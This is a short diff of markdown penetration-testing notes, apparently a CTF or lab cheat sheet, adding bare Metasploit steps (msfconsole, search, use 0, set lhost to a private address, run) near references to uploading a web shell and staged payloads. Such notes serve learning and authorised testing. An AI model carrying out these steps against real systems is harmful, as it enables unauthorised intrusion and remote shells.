@@ -59,7 +59,23 @@ Upload go to shell page
 ![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/49b877f9-8979-4760-9b1f-038c410c9e7f)
 
 
-# Shells with Metasploit
+# Metasploit
+
+
+msfconsole
+
+Search
+
+use 0
+
+options/info
+
+set lhost 10.0.0.6
+
+run
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/bdad199f-8392-47e3-b680-87bf8ad77436)
+
 
 ## Staged vs non staged
 ```
